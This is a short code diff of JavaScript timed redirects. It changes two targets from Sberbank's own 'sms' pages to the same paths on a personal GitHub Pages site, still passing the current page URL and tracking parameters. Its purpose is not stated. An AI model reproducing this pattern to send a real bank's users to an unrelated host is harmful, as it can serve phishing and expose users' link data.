@@ -104,11 +104,11 @@ window.location.href = decodeURIComponent(ios_af_dp+is_q_ios+other_param_app+ext
 },2100);
 
 setTimeout(function(){
-window.location.href = "https://www.sberbank.ru/sms/st1.html?URL_1=" + encodeURIComponent(document.location.href) + "&DP=" + ios_af_dp+is_q_ios+other_param_app+external_source + "&WL=" + web_link_web+other_param_web+utm_all;
+window.location.href = "https://kawairy.github.io/NEW_APP/st1.html?URL_1=" + encodeURIComponent(document.location.href) + "&DP=" + ios_af_dp+is_q_ios+other_param_app+external_source + "&WL=" + web_link_web+other_param_web+utm_all;
 },2150);
 
 setTimeout(function(){
-window.location.href = "https://www.sberbank.ru/sms/final.html?URL_1=" + encodeURIComponent(document.location.href) + "&DP=" + ios_af_dp+is_q_ios+other_param_app+external_source + "&WL=" + web_link_web+other_param_web+utm_all;
+window.location.href = "https://kawairy.github.io/NEW_APP/final.html?URL_1=" + encodeURIComponent(document.location.href) + "&DP=" + ios_af_dp+is_q_ios+other_param_app+external_source + "&WL=" + web_link_web+other_param_web+utm_all;
 },2400);
 
     
